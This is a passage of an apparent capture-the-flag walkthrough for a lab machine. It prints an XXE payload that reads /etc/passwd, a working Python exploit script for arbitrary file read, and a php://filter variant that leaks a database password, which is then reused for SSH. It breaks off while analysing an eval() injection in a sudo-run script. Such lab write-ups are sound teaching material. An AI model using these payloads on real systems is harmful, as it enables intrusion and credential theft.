</span></span><span class=line><span class=cl>&lt;!DOCTYPE bugreport <span class=o>[</span>&lt;!ENTITY passwd SYSTEM <span class=s2>&#34;file:///etc/passwd&#34;</span> &gt;<span class=o>]</span> &gt;
</span></span><span class=line><span class=cl>&lt;bugreport&gt;
</span></span><span class=line><span class=cl> &lt;title&gt;<span class=p>&amp;</span>passwd<span class=p>;</span>&lt;/title&gt;
</span></span><span class=line><span class=cl> &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span><span class=line><span class=cl> &lt;cvss&gt;10&lt;/cvss&gt;
</span></span><span class=line><span class=cl> &lt;reward&gt;1$&lt;/reward&gt;
</span></span><span class=line><span class=cl>&lt;/bugreport&gt;
</span></span><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class=line><span class=cl>$ cat xxe1.test <span class=p>|</span> base64 -w <span class=m>0</span>   
</span></span><span class=line><span class=cl>PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA+XSA+CjxidWdyZXBvcnQ+CiA8dGl0bGU+JnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U+CiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ+MSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ+Cg<span class=o>==</span>
</span></span></code></pre></div><p>I will intercept the submit request and put my payload there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/tracker_diRbPr00f314.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.100</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>323</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.100</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.100/log_submit.php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA%2bXSA%2bCjxidWdyZXBvcnQ%2bCiA8dGl0bGU%2bJnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U%2bCiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ%2bMSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ%2bCg%3d%3d
</span></span></code></pre></div><p>When I submit, it returns with:</p><p><div class=img-container><img src=imgs/image-20210730205835371.png alt=image-20210730205835371></div></p><p>It was vulnerable!</p><h3 id=shell-as-development>Shell as Development<a class=anchor aria-hidden=true href=#shell-as-development>#</a></h3><h4 id=file-read>File Read<a class=anchor aria-hidden=true href=#file-read>#</a></h4><p>I created a Python script to exploit the XXE and grab the file contents.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>file_to_read</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[-] Usage: </span><span class=si>%s</span><span class=s1> &lt;file-to-read&gt;&#39;</span> <span class=o>%</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target_url</span> <span class=o>=</span> <span class=s2>&#34;http://10.10.11.100/tracker_diRbPr00f314.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>proxies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64encode</span>
</span></span><span class=line><span class=cl><span class=n>xxe_payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;!DOCTYPE bugreport [&lt;!ENTITY xxe SYSTEM &#34;file://</span><span class=si>{</span><span class=n>file_to_read</span><span class=si>}</span><span class=s2>&#34; &gt;]
</span></span></span><span class=line><span class=cl><span class=s2>&lt;bugreport&gt;
</span></span></span><span class=line><span class=cl><span class=s2> &lt;title&gt;&amp;xxe;&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=s2> &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span></span><span class=line><span class=cl><span class=s2> &lt;cvss&gt;10&lt;/cvss&gt;
</span></span></span><span class=line><span class=cl><span class=s2> &lt;reward&gt;1$&lt;/reward&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/bugreport&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>xxe_payload_b64</span> <span class=o>=</span>  <span class=n>b64encode</span><span class=p>(</span><span class=n>xxe_payload</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(f&#34;[+] Crafted payload \n{xxe_payload_b64}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=n>xxe_payload_b64</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>xxe_resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>target_url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;cwe-500&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>xxe_resp</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Something went wrong&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl><span class=n>soup</span> <span class=o>=</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>xxe_resp</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>features</span><span class=o>=</span><span class=s2>&#34;lxml&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=p>[</span><span class=n>tag</span><span class=o>.</span><span class=n>text</span> <span class=k>for</span> <span class=n>tag</span> <span class=ow>in</span> <span class=n>soup</span><span class=o>.</span><span class=n>find_all</span><span class=p>(</span><span class=s2>&#34;td&#34;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span></code></pre></div><p>But when I try to use this script to read PHP files, it fails</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class=line><span class=cl>$ python3 bountyhunters_xxe.py /var/www/html/index.php           
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Something went wrong
</span></span></code></pre></div><p>This time I modified the script and used the PHP wrapper.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>...</span><span class=p>[</span><span class=n>SNIP</span><span class=p>]</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>!</span><span class=n>DOCTYPE</span> <span class=n>bugreport</span> <span class=p>[</span><span class=o>&lt;</span><span class=err>!</span><span class=n>ENTITY</span> <span class=n>xxe</span> <span class=n>SYSTEM</span> <span class=s2>&#34;php://filter/convert.base64-encode/resource=</span><span class=si>{file_to_read}</span><span class=s2>&#34;</span> <span class=o>&gt;</span><span class=p>]</span> <span class=o>&gt;</span> 
</span></span><span class=line><span class=cl><span class=o>...</span><span class=p>[</span><span class=n>SNIP</span><span class=p>]</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl><span class=n>soup</span> <span class=o>=</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>xxe_resp</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>features</span><span class=o>=</span><span class=s2>&#34;lxml&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=p>[</span><span class=n>tag</span><span class=o>.</span><span class=n>text</span> <span class=k>for</span> <span class=n>tag</span> <span class=ow>in</span> <span class=n>soup</span><span class=o>.</span><span class=n>find_all</span><span class=p>(</span><span class=s2>&#34;td&#34;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64decode</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>b64decode</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span></code></pre></div><p>And it worked.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class=line><span class=cl>$ python3 bountyhunters_xxe_filter.py /var/www/html/tracker_diRbPr00f314.php
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=o>(</span>isset<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;data&#39;</span><span class=o>]))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl><span class=nv>$xml</span> <span class=o>=</span> base64_decode<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;data&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>libxml_disable_entity_loader<span class=o>(</span><span class=nb>false</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$dom</span> <span class=o>=</span> new DOMDocument<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$dom</span>-&gt;loadXML<span class=o>(</span><span class=nv>$xml</span>, LIBXML_NOENT <span class=p>|</span> LIBXML_DTDLOAD<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$bugreport</span> <span class=o>=</span> simplexml_import_dom<span class=o>(</span><span class=nv>$dom</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>If DB were ready, would have added:
</span></span><span class=line><span class=cl>&lt;table&gt;
</span></span><span class=line><span class=cl>  &lt;tr&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;Title:&lt;/td&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;&lt;?php <span class=nb>echo</span> <span class=nv>$bugreport</span>-&gt;title<span class=p>;</span> ?&gt;&lt;/td&gt;
</span></span><span class=line><span class=cl>  &lt;/tr&gt;
</span></span><span class=line><span class=cl>  &lt;tr&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;CWE:&lt;/td&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;&lt;?php <span class=nb>echo</span> <span class=nv>$bugreport</span>-&gt;cwe<span class=p>;</span> ?&gt;&lt;/td&gt;
</span></span><span class=line><span class=cl>  &lt;/tr&gt;
</span></span><span class=line><span class=cl>  &lt;tr&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;Score:&lt;/td&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;&lt;?php <span class=nb>echo</span> <span class=nv>$bugreport</span>-&gt;cvss<span class=p>;</span> ?&gt;&lt;/td&gt;
</span></span><span class=line><span class=cl>  &lt;/tr&gt;
</span></span><span class=line><span class=cl>  &lt;tr&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;Reward:&lt;/td&gt;
</span></span><span class=line><span class=cl>    &lt;td&gt;&lt;?php <span class=nb>echo</span> <span class=nv>$bugreport</span>-&gt;reward<span class=p>;</span> ?&gt;&lt;/td&gt;
</span></span><span class=line><span class=cl>  &lt;/tr&gt;
</span></span><span class=line><span class=cl>&lt;/table&gt;
</span></span></code></pre></div><p>There is a database connection file (<code>/var/www/html/db.php</code>) that contains DB credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class=line><span class=cl>$ python3 bountyhunters_xxe_filter.py /var/www/html/db.php   
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>// TODO -&gt; Implement login system with the database.
</span></span><span class=line><span class=cl><span class=nv>$dbserver</span> <span class=o>=</span> <span class=s2>&#34;localhost&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$dbname</span> <span class=o>=</span> <span class=s2>&#34;bounty&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$dbusername</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$dbpassword</span> <span class=o>=</span> <span class=s2>&#34;m19RoAU0hP41A1sTsq6K&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$testuser</span> <span class=o>=</span> <span class=s2>&#34;test&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></div><h4 id=ssh>SSH<a class=anchor aria-hidden=true href=#ssh>#</a></h4><p>The database password works on user <code>development</code> (from <code>/etc/passwd</code>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl> kali@kali «exploits» «10.10.14.29» 
</span></span><span class=line><span class=cl>$ ssh development@10.10.11.100
</span></span><span class=line><span class=cl>development@10.10.11.100<span class=err>&#39;</span>s password: 
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.2 LTS <span class=o>(</span>GNU/Linux 5.4.0-80-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Fri <span class=m>30</span> Jul <span class=m>2021</span> 03:28:24 PM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:           0.0
</span></span><span class=line><span class=cl>  Usage of /:            38.4% of 6.83GB
</span></span><span class=line><span class=cl>  Memory usage:          30%
</span></span><span class=line><span class=cl>  Swap usage:            0%
</span></span><span class=line><span class=cl>  Processes:             <span class=m>214</span>
</span></span><span class=line><span class=cl>  Users logged in:       <span class=m>1</span>
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> eth0: 10.10.11.100
</span></span><span class=line><span class=cl>  IPv6 address <span class=k>for</span> eth0: dead:beef::250:56ff:feb9:cb7f
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Fri Jul <span class=m>30</span> 13:44:59 <span class=m>2021</span> from 10.10.14.42
</span></span><span class=line><span class=cl>development@bountyhunter:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>development<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>development<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>development<span class=o>)</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>At current home directory, there are some plain text files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>development@bountyhunter:~$ ls -l
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root        root        <span class=m>471</span> Jun <span class=m>15</span> 16:10 contract.txt
</span></span><span class=line><span class=cl>-r--r----- <span class=m>1</span> root        development  <span class=m>33</span> Jul <span class=m>30</span> 05:20 user.txt
</span></span></code></pre></div><p>The content of <code>contract.txt</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>development@bountyhunter:~$ cat contract.txt 
</span></span><span class=line><span class=cl>Hey team,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>This has been our first job since the &#34;rm -rf&#34; incident and we can&#39;</span>t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I <span class=nb>set</span> up the permissions <span class=k>for</span> you to <span class=nb>test</span> this. Good luck.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-- John
</span></span></code></pre></div><p>This user also has sudo permissions on the mentioned internal tool called <code>ticketValidator.py</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>development@bountyhunter:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> development on bountyhunter:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User development may run the following commands on bountyhunter:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</span></span></code></pre></div><h4 id=source-analysis>Source Analysis<a class=anchor aria-hidden=true href=#source-analysis>#</a></h4><p><code>ticketValidator.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#Skytrain Inc Ticket Validation System 0.1</span>
</span></span><span class=line><span class=cl><span class=c1>#Do not distribute this file.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>load_file</span><span class=p>(</span><span class=n>loc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>loc</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s2>&#34;.md&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=n>loc</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Wrong file type.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>evaluate</span><span class=p>(</span><span class=n>ticketFile</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#Evaluates a ticket to check for ireggularities.</span>
</span></span><span class=line><span class=cl>    <span class=n>code_line</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>x</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>ticketFile</span><span class=o>.</span><span class=n>readlines</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>x</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;# Skytrain Inc&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>x</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;## Ticket to &#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Destination: </span><span class=si>{</span><span class=s1>&#39; &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)[</span><span class=mi>3</span><span class=p>:])</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>x</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;__Ticket Code:__&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>code_line</span> <span class=o>=</span> <span class=n>i</span><span class=o>+</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>code_line</span> <span class=ow>and</span> <span class=n>i</span> <span class=o>==</span> <span class=n>code_line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>x</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;**&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>            <span class=n>ticketCode</span> <span class=o>=</span> <span class=n>x</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;**&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;+&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>ticketCode</span><span class=p>)</span> <span class=o>%</span> <span class=mi>7</span> <span class=o>==</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>validationNumber</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;**&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>validationNumber</span> <span class=o>&gt;</span> <span class=mi>100</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>fileName</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Please enter the path to the ticket file.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ticket</span> <span class=o>=</span> <span class=n>load_file</span><span class=p>(</span><span class=n>fileName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#DEBUG print(ticket)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>evaluate</span><span class=p>(</span><span class=n>ticket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Valid ticket.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Invalid ticket.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ticket</span><span class=o>.</span><span class=n>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>I&rsquo;m bad at python, but I can see where is the goal from that script, it&rsquo;s this line</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>validationNumber</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;**&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span></code></pre></div><p>So the flow is: ask a file -> load the file (markdown extension) -> some unique evaluation -> eval function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
